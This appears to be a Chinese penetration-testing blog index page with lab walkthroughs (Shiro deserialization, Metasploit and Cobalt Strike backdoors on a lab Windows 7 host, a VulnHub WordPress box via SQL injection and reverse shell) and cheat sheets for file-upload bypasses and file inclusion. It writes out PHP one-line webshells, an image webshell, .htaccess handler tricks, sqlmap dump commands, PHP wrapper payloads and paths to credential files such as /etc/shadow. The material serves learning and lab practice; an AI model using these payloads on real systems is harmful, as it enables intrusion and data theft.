<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路径  http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662638419_6319d953c48f674cec159.png!small"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-vulnhub--shiro"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/09/05/vulnhub--shiro/"
    >vulnhub--shiro</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/09/05/vulnhub--shiro/" class="article-date">
  <time datetime="2022-09-05T13:23:05.000Z" itemprop="datePublished">2022-09-05</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/vulnhub/">vulnhub</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h5 id="CVE-2016-4437-反序列化"><a href="#CVE-2016-4437-反序列化" class="headerlink" title="CVE-2016-4437 反序列化"></a>CVE-2016-4437 反序列化</h5><p>猜测：<br>进入靶场之后发现是个登录框，bp抓包，在历史记录中发现了rememberMe，怀疑存在shiro反序列化漏洞<br><img src="https://image.3001.net/images/20220905/1662376550_6315da6630132f0c8fc6c.png!small"><br>验证猜测：<br>先在bp项目选项处设置使用默认的burp collaborator服务器<br><img src="https://image.3001.net/images/20220905/1662376745_6315db29990aefa7fb978.png!small"><br>接下来点击bp左上角的burp-&gt;burp collaborator客户端<br><img src="https://image.3001.net/images/20220905/1662376910_6315dbce3b7b1d74a9829.png!small"><br>复制生成的dnslog的url<br><img src="https://image.3001.net/images/20220905/1662377014_6315dc366575dade76469.png!small"><br>用python脚本生成dnslog记录的payload<br><img src="https://image.3001.net/images/20220905/1662377215_6315dcffbc6bd70b35327.png!small"><br>复制payload，构造cookie，发至重发模块点击发送<br><img src="https://image.3001.net/images/20220905/1662377378_6315dda22087cfb7b7112.png!small"><br>成功接收到dnslog记录，猜测正确<br><img src="https://image.3001.net/images/20220905/1662377657_6315deb9ee3a364bff3f9.png!small"><br>利用漏洞：<br>打开反序列化漏洞利用工具，输入url，点击爆破密钥和爆破利用链及回显<br><img src="https://image.3001.net/images/20220905/1662377945_6315dfd932fac5be599c0.png!small"><br>点击命令执行，输入whoami，成功执行<br><img src="https://image.3001.net/images/20220905/1662378015_6315e01f5835a4a8e8939.png!small"></p>
<h5 id="CVE-2020-1957-未授权访问"><a href="#CVE-2020-1957-未授权访问" class="headerlink" title="CVE-2020-1957 未授权访问"></a>CVE-2020-1957 未授权访问</h5><p>进入靶场，随便点了一下就302跳转到登录页面了<br><img src="https://image.3001.net/images/20220905/1662383261_6315f49d4da6cdafd11fa.png!small"><br>bp抓包，在响应包中发现rememberMe<br><img src="https://image.3001.net/images/20220905/1662383489_6315f581d4c7a91188720.png!small"><br>构造url，成功登录到管理界面<br><img src="https://image.3001.net/images/20220905/1662384047_6315f7afc15090399b115.png!small"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-msf联动cs"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/08/26/msf%E8%81%94%E5%8A%A8cs/"
    >msf联动cs</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/08/26/msf%E8%81%94%E5%8A%A8cs/" class="article-date">
  <time datetime="2022-08-26T12:11:36.000Z" itemprop="datePublished">2022-08-26</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/kali%E6%B8%97%E9%80%8F/">kali渗透</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>环境：win7，kali<br>ip:192.168.168.129(win7)，192.168.43.191(kali)<br>先用msfvenom生成后门<br><img src="https://image.3001.net/images/20220826/1661513829_6308b0651daa0ea6efe7b.png!small"><br>启动metaspliot<br><img src="https://image.3001.net/images/20220826/1661513950_6308b0de3955a2884f989.png!small"><br>metaspliot设置侦听<br><img src="https://image.3001.net/images/20220826/1661514105_6308b179d4094e2fa0d07.png!small"><br>将木马传至win7，双击运行<br><img src="https://image.3001.net/images/20220826/1661514225_6308b1f1ef65e265d0832.png!small"><br>成功拿到shell<br><img src="https://image.3001.net/images/20220826/1661514342_6308b266f0d940070a71c.png!small"><br>接下来就是上线cs了<br>先在服务端kali开启cs服务<br><img src="https://image.3001.net/images/20220826/1661514562_6308b342e967f9e292213.png!small"><br>在win7打开cs的exe文件，输入服务端ip，端口，用户名，密码，点击连接<br><img src="https://image.3001.net/images/20220826/1661514674_6308b3b2a7478e1100c1e.png!small"><br>成功登录cs<br><img src="https://image.3001.net/images/20220826/1661514808_6308b438a9ed09905db1c.png!small"><br>接下来生成监听器，点击左上角的cobalt strike，选择listen<br><img src="https://image.3001.net/images/20220826/1661514915_6308b4a30e8e259bf0ada.png!small"><br>生成木马，点击左上角的attacks，选择packages-&gt;windows executable<br><img src="https://image.3001.net/images/20220826/1661515057_6308b53140d8d0f5517c4.png!small"><br>选择监听器<br><img src="https://image.3001.net/images/20220826/1661515201_6308b5c1a2bd42d24e59b.png!small"><br>选择木马生成位置<br><img src="https://image.3001.net/images/20220826/1661515264_6308b60043c4292e299de.png!small"><br>将木马传到靶机，双击运行，发现成功上线<br><img src="https://image.3001.net/images/20220826/1661515446_6308b6b65f2b15ffb4f88.png!small"><br><img src="https://image.3001.net/images/20220826/1661515635_6308b7731cdeb6fbf8ba7.png!small"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/" rel="tag">kali</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-vulnhub--freshly"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/08/16/vulnhub--freshly/"
    >vulnhub--freshly</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/08/16/vulnhub--freshly/" class="article-date">
  <time datetime="2022-08-16T00:46:52.000Z" itemprop="datePublished">2022-08-16</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/vulnhub/">vulnhub</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>老规矩先arp扫存活主机</p>
<p><img src="https://image.3001.net/images/20220815/1660552444_62fa04fcadbf723a4f6ea.png!small"></p>
<p>nmap扫端口</p>
<p><img src="https://image.3001.net/images/20220815/1660552454_62fa05063c836fdf57316.png!small"><br>可以看到该网站开放了80,443,8080端口，尝试访问80和8080端口</p>
<p><img src="https://image.3001.net/images/20220815/1660552480_62fa05205a472489c8d98.png!small"><br>80端口是一张图片，好像没啥用</p>
<p><img src="https://image.3001.net/images/20220815/1660552505_62fa0539a3bead1963f13.png!small"><br>8080端口则是一个链接，点进去发现是一个wordpress网站<br>没看出啥，尝试扫目录</p>
<p><img src="https://image.3001.net/images/20220815/1660554333_62fa0c5d5e38036c0e01a.png!small"></p>
<p><img src="https://image.3001.net/images/20220815/1660554408_62fa0ca8291e52a8f44d0.png!small"></p>
<p>发现wordpress后台，尝试爆破，没成功，试试御剑再扫</p>
<p><img src="https://image.3001.net/images/20220815/1660553051_62fa075b5fb64c331b626.png!small"></p>
<p>发现几个熟悉的目录，先看看/login.php</p>
<p><img src="https://image.3001.net/images/20220815/1660553131_62fa07ab40334adcfad5c.png!small"></p>
<p>一个登录页面，任意输入,发现只会返回0，尝试万能密码1’ or 1=1#,发现返回1</p>
<p><img src="https://image.3001.net/images/20220815/1660553269_62fa0835430fcd2138e93.png!small"></p>
<p>由此可得存在post型sql注入，bp抓包保存为sql.txt文件，丢sqlmap里跑</p>
<p>爆库：sqlmap -r sql.txt -dbs –batch</p>
<p><img src="https://image.3001.net/images/20220815/1660553446_62fa08e6e1272deab9ab0.png!small"></p>
<p>爆users表的时候发现users里面是空的，尝试爆login表</p>
<p>爆表：python sqlmap.py -r sql.txt -D login -tables –batch</p>
<p><img src="https://image.3001.net/images/20220815/1660553543_62fa0947a8d01579e7667.png!small"></p>
<p>梭哈 python sqlmap.py -r sql.txt -D login -T users -dump –batch</p>
<p><img src="https://image.3001.net/images/20220815/1660553698_62fa09e2592bbe9f671d8.png!small"></p>
<p>到处尝试了一下账号密码，好像还是没啥用。。。</p>
<p>接着看其他的库，最后在wordpress8080库里面找到了后台密码</p>
<p><img src="https://image.3001.net/images/20220815/1660554047_62fa0b3fd7146f08cf84c.png!small"></p>
<p>成功登录后台</p>
<p><img src="https://image.3001.net/images/20220815/1660554531_62fa0d2334db25d9b5def.png!small"></p>
<p>接下来就尝试寻找漏洞拿shell了</p>
<p>用msfvenom生成反弹shell的木马</p>
<p><img src="https://image.3001.net/images/20220815/1660554837_62fa0e554c7da21f2103a.png!small"></p>
<p>将木马写入404 template</p>
<p><img src="https://image.3001.net/images/20220815/1660554974_62fa0ede612da52f52fe7.png!small"></p>
<p>msf反弹shell</p>
<p>访问<a target="_blank" rel="noopener" href="http://192.168.56.104:8080/wordpress/wp-content/themes/twentythirteen/404.php%EF%BC%8C%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9shell">http://192.168.56.104:8080/wordpress/wp-content/themes/twentythirteen/404.php，成功反弹shell</a></p>
<p><img src="https://image.3001.net/images/20220815/1660555193_62fa0fb95b349cc810748.png!small"></p>
<p>接着就是提权，尝试su root，发现居然可以直接切换，密码则是wordpress的后台密码</p>
<p><img src="https://image.3001.net/images/20220815/1660555400_62fa10880c6ed827b5eb5.png!small"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-文件上传"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
    >文件上传</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/08/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
  <time datetime="2022-08-03T00:35:29.000Z" itemprop="datePublished">2022-08-03</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>上传文件时，服务器端代码未对客户上传的文件进行严格的验证和过滤</p>
<h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><h4 id="js检测绕过"><a href="#js检测绕过" class="headerlink" title="js检测绕过"></a>js检测绕过</h4><p>绕过方法:bp抓包修改，在浏览器中修改前端代码</p>
<h3 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h3><h4 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h4><h5 id="黑名单绕过方式"><a href="#黑名单绕过方式" class="headerlink" title="黑名单绕过方式"></a>黑名单绕过方式</h5><h6 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h6><p>双写绕过</p>
<h6 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h6><h6 id="文件后面加-点-或-点空格点"><a href="#文件后面加-点-或-点空格点" class="headerlink" title="文件后面加.(点)或. .(点空格点)"></a>文件后面加.(点)或. .(点空格点)</h6><p>对于Windows系统，文件最后一个符号是.时会被丢弃</p>
<h6 id="文件后面加-DATA"><a href="#文件后面加-DATA" class="headerlink" title="文件后面加::$DATA"></a>文件后面加::$DATA</h6><p>php+windows的情况下，如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持::$DATA之前的文件名</p>
<h5 id="常用php文件后缀名"><a href="#常用php文件后缀名" class="headerlink" title="常用php文件后缀名"></a>常用php文件后缀名</h5><p>php，php7，php5，php4，php3，php2，php1，html，htm，phtml，pht</p>
<h5 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h5><h6 id="php-00截断"><a href="#php-00截断" class="headerlink" title="php%00截断"></a>php%00截断</h6><p>截断原理:由于00代表结束符，所以会把00后面的所有字符删除</p>
<h4 id="文件类型绕过-MIME"><a href="#文件类型绕过-MIME" class="headerlink" title="文件类型绕过(MIME)"></a>文件类型绕过(MIME)</h4><p>绕过方式：bp抓包修改Content-Type的值</p>
<h4 id="上传配置文件绕过"><a href="#上传配置文件绕过" class="headerlink" title="上传配置文件绕过"></a>上传配置文件绕过</h4><h5 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;文件名&quot;</span>&gt;  </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<h5 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=文件名</span><br></pre></td></tr></table></figure>

<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>一些网站上传文件的逻辑是先允许上传任意文件，  然后检查上传的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短的时间差（因为要执行检查文件和删除文件的操作），攻击者就可以利用这个时间差完成竞争条件的上传漏洞攻击。</p>
<h4 id="一句话木马及常用绕过方式"><a href="#一句话木马及常用绕过方式" class="headerlink" title="一句话木马及常用绕过方式"></a>一句话木马及常用绕过方式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;pHp&quot;</span>&gt;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-文件包含"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/07/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"
    >文件包含</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/07/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
  <time datetime="2022-07-25T00:42:01.000Z" itemprop="datePublished">2022-07-25</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h4><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
<h4 id="文件包含常用函数"><a href="#文件包含常用函数" class="headerlink" title="文件包含常用函数"></a>文件包含常用函数</h4><blockquote>
<p>include():找不到被包含的文件时会产生致命错误，并停止脚本运行</p>
<p>require():找不到被包含的错误时只会产生警告，脚本将继续运行</p>
<p>include_once():与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</p>
<p>require_once():与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</p>
</blockquote>
<h4 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h4><h5 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h5><p>本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格过滤允许遍历目录的字符注入浏览器并执行</p>
<h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞</p>
<p>注：本地文件包含与远程文件包含有着相同的原理，但前者只能包含本地服务器上存在的文件，而后者可以包含远程服务器上的文件</p>
<h4 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h4><h5 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h5><blockquote>
<p>c:\boot.ini // 查看系统版本</p>
<p>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</p>
<p>c:\windows\repair\sam // 存储Windows系统初次安装的密码</p>
<p>c:\ProgramFiles\mysql\my.ini // MySQL配置</p>
<p>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</p>
<p>c:\windows\php.ini // php 配置信息</p>
</blockquote>
<h5 id="Linux-Unix系统"><a href="#Linux-Unix系统" class="headerlink" title="Linux/Unix系统"></a>Linux/Unix系统</h5><blockquote>
<p>/etc/passwd // 账户信息</p>
<p>/etc/shadow // 账户密码文件</p>
<p>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</p>
<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</p>
<p>/usr/local/app/php5/lib/php.ini // PHP相关配置</p>
<p>/etc/httpd/conf/httpd.conf // Apache配置文件</p>
<p>/etc/my.conf // mysql 配置文件</p>
</blockquote>
<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><h5 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h5><p>常用于读取本地文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=file://C:\phpStudy\PHPTutorial\WWW\phpinfo.php</span><br></pre></td></tr></table></figure>

<h5 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h5><p>读取数据流<br>条件：<code>allow_url_fopen:on</code> ;<code>allow_url_include :on</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">http://127.0.0.1/test.php?cmd=data://text/plain;base64,PD9waHANCiBwaHBpbmZvKCk7IA0KPz4=(只在php版本小于5.3时成功过)</span><br></pre></td></tr></table></figure>

<h5 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h5><p>访问压缩包里的文件<br><em>注：zip://后面只能使用绝对路径</em><br><em>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23</em><br><em>只需要是zip的压缩包即可，后缀名可以任意更改</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=zip://C:\phpStudy\PHPTutorial\WWW\test.zip%23phpinfo.php</span><br></pre></td></tr></table></figure>

<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>与zip://类似，区别在phar中相对路径和绝对路径都可以使用<br><em>注：php版本需大于5.3</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=phar://test.zip/phpinfo.php</span><br><span class="line">http://127.0.0.1/test.php?cmd=phar://C:\phpStudy\PHPTutorial\WWW\test.zip\phpinfo.php</span><br></pre></td></tr></table></figure>

<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p>读取指定文件源码<br>例如用base64加密读取phpinfo.php的源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/test.php?cmd=php://filter/read=convert.base64-encode/resource=C:\phpStudy\PHPTutorial\WWW\phpinfo.php</span><br></pre></td></tr></table></figure>

<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>访问各个输入流<br>条件：<code>allow_url_include :on</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=php://input</span><br></pre></td></tr></table></figure>

<p>步骤:先访问该网址，然后bp抓包，最下面添加<code>&lt;?php phpinfo();?&gt;</code>，放包</p>
<p><em>注</em>：除了data://和php://input，其他的伪协议都不受allow_url_fopen和allow_url_include控制</p>
<h4 id="文件包含绕过"><a href="#文件包含绕过" class="headerlink" title="文件包含绕过"></a>文件包含绕过</h4><h5 id="指定前缀绕过"><a href="#指定前缀绕过" class="headerlink" title="指定前缀绕过"></a>指定前缀绕过</h5><h6 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h6><p>使用 ../../ 来返回上一目录，被称为目录遍历</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/../../../phpinfo.php</span><br></pre></td></tr></table></figure>

<h6 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h6><p>base64编码,url编码<br>例如用url编码绕过../</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/%2e%2e/phpinfo.php</span><br></pre></td></tr></table></figure>

<h5 id="指定后缀绕过"><a href="#指定后缀绕过" class="headerlink" title="指定后缀绕过"></a>指定后缀绕过</h5><h6 id="url绕过"><a href="#url绕过" class="headerlink" title="url绕过"></a>url绕过</h6><p>在url后面加上?,#,空格<br>原理：利用query(?),fragment(#),空格来绕过后缀限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpinfo.php?</span><br><span class="line">http://127.0.0.1/phpinfo.php%23</span><br><span class="line">http://127.0.0.1/phpinfo.php%20</span><br></pre></td></tr></table></figure>

<h6 id="00字符截断"><a href="#00字符截断" class="headerlink" title="00字符截断"></a>00字符截断</h6><p>条件:<code>magic_quotes_gpc:off</code>，php版本&lt;5.3.4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=phpinfo.php%00</span><br></pre></td></tr></table></figure>

<h6 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h6><p>不断的重复 ./，指定的后缀会在达到最大值后会被直接丢弃掉<br>条件:php版本&lt;5.2.8<br>在windows中，点号需要长于256；linux需要长于4096</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=./././... ... ././phpinfo.php</span><br></pre></td></tr></table></figure>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-MySQL"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/07/13/MySQL/"
    >MySQL</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/07/13/MySQL/" class="article-date">
  <time datetime="2022-07-13T12:27:00.000Z" itemprop="datePublished">2022-07-13</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/MySQL/">MySQL</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="MySQL通用语法"><a href="#MySQL通用语法" class="headerlink" title="MySQL通用语法"></a>MySQL通用语法</h3><p>SQL语句可以单行或者多行书写，以分号结尾<br>可以用缩进和空格来增加语句的可读性<br>MySQL的SQL语句不分大小写</p>
<h3 id="MySQL常用的数据类型"><a href="#MySQL常用的数据类型" class="headerlink" title="MySQL常用的数据类型"></a>MySQL常用的数据类型</h3><table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>int</td>
<td>整型</td>
</tr>
<tr>
<td>double</td>
<td>浮点型</td>
</tr>
<tr>
<td>varchar</td>
<td>字符串型</td>
</tr>
<tr>
<td>date</td>
<td>日期类型</td>
</tr>
</tbody></table>
<h3 id="对数据库的增删改查"><a href="#对数据库的增删改查" class="headerlink" title="对数据库的增删改查"></a>对数据库的增删改查</h3><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><p><img src="https://img-blog.csdnimg.cn/9318bc51bd4c463abad786b44ced9e3d.png"></p>
<h4 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h4><p><img src="https://img-blog.csdnimg.cn/b391ebfb108d49338272f2d635ca3843.png"></p>
<h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h4><p><img src="https://img-blog.csdnimg.cn/70598e8191494857af74b4802fe02084.png"></p>
<h4 id="切换数据库"><a href="#切换数据库" class="headerlink" title="切换数据库"></a>切换数据库</h4><p><img src="https://img-blog.csdnimg.cn/a44d10f266764951b6f544a47ea91d95.png"></p>
<h4 id="查看正在使用的数据库"><a href="#查看正在使用的数据库" class="headerlink" title="查看正在使用的数据库"></a>查看正在使用的数据库</h4><p><img src="https://img-blog.csdnimg.cn/5a736007687d427fa41ecdac592d277c.png"></p>
<h3 id="对数据表的增删改查"><a href="#对数据表的增删改查" class="headerlink" title="对数据表的增删改查"></a>对数据表的增删改查</h3><h4 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h4><p><img src="https://img-blog.csdnimg.cn/05a216c816484c1eb026d9fc8a936f48.png"></p>
<h4 id="查看当前数据库中的所有表"><a href="#查看当前数据库中的所有表" class="headerlink" title="查看当前数据库中的所有表"></a>查看当前数据库中的所有表</h4><p><img src="https://img-blog.csdnimg.cn/9169bf392d4843859f75fef388d3f6eb.png"></p>
<h4 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构<img src="https://img-blog.csdnimg.cn/389668b94da04c1b983eb03e764fcc5a.png"></h4><p><img src="https://img-blog.csdnimg.cn/073452b183da471a9b948f4f9c4a824c.png"></p>
